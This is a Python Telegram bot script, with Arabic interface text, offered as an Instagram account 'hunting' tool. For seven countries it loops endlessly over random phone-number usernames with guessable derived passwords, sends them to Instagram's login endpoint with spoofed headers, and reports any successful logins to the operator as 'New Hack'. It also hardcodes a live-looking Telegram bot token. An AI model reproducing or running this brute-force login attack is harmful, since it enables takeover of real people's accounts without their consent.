import webbrowser  
import requests
import random
import telebot
import os
from telebot import types
from uuid import uuid4
import webbrowser
#webbrowser.open('https://t.me/TT606TT')
ToKen = '2141272014:AAFyb01IAU_nZghAu8905PV5b6hPHgwu6Oo'
print("تم تشغيل الاداه اذهب الى بوتك لبدء الصيد ")
bot = telebot.TeleBot(ToKen)
@bot.message_handler(commands = ["start"])
def Start(message):
 Name = message.chat.first_name
 User = message.from_user.username 
 ID = message.chat.id
 A = types.InlineKeyboardMarkup(row_width=2)
 B = types.InlineKeyboardButton(text ="✅ قناه المبرمج" , url = "https://t.me/TT606TT")
 C = types.InlineKeyboardButton(text ="✅ مراسة مبرمج  " , url = "t.me/mrx_xx95")
 D =  types.InlineKeyboardButton(text = "✅ START HACK",callback_data="y")
 A.add(B,C,D)
 bot.reply_to(message, """  
*- اهلا عزيزي ( {} )                             
- في بوت صيد  حسابات ( Intagram )✅
- قم بــ ضغط على ( START HACK ) لبدء الصيد               
- معرفك : [ @{} ]                                    
- ايديك : [ {} ]                                        *
""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)	
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data =="y":
        button(call.message)
    if call.data =="Iran":
        Iran(call.message)
    if call.data =="Iraq":
         Iraq(call.message)
    if call.data =="Tr":
         TR(call.message)  
    if call.data =="EG":
    	EGYPT(call.message)
    if call.data == "Ku":
    	Kuwait(call.message)
    if call.data == "SA":
    	SAUDIA(call.message)
    if call.data == "Mo":
    	Morocco(call.message)
P  = types.InlineKeyboardButton(text = "🇮🇷 IRAN : إيران", callback_data= 'Iran')
P1 = types.InlineKeyboardButton(text = "🇮🇶 IRAQ : العراق", callback_data = 'Iraq')
P2 = types.InlineKeyboardButton(text = "🇹🇷 TURKEY : تركيا", callback_data = 'Tr')
P3 = types.InlineKeyboardButton(text = "🇪🇬 EGYPT :  مصر", callback_data = 'EG')
P4 = types.InlineKeyboardButton(text = "🇰🇼 KUWAIT : الكويت", callback_data = 'Ku')
P5 = types.InlineKeyboardButton(text = "🇸🇦 SAUDIA : السعودية", callback_data = 'SA')
P6 = types.InlineKeyboardButton(text = "🇲🇦 MOROCCO : المغرب",callback_data = 'Mo')
def button(message):
    O0 = types.InlineKeyboardMarkup(row_width=1)
    O0.add(P6,P,P1,P2,P3,P4,P5)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**Choose**",parse_mode='markdown',reply_markup=O0)          
def Iran(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+98912' + us
		password = '0912' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o) 
		
def Iraq(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}


		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+964781' + us
		password = '0781' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o) 
def TR(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(8))))
		username =  '+9053' + us
		password = '053' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def EGYPT(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(8))))
		username = '+2011' + us
		password = '011' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def Kuwait(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(6))))
		username = '+96565' + us
		password = '65' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o)
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
def SAUDIA(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321') 
		us = str(''.join((random.choice(user) for i in range(8))))
		username = '+9665' + us
		password = '05' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o) 
#
#

#
#
#
#
#
#
#
#
#
#
#
def Morocco(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+21260' + us
		password = '060' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f""" New Hack 😈😈 \n user ✅  : {username}\n pass ✅ : {password} \n DIV : @mrx_xx95 \n _______________________________________ """)
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='MRX')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='MRX1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='MRX2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='MRX3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram MRX *",parse_mode = "markdown",reply_markup=o) 
bot.polling(True)
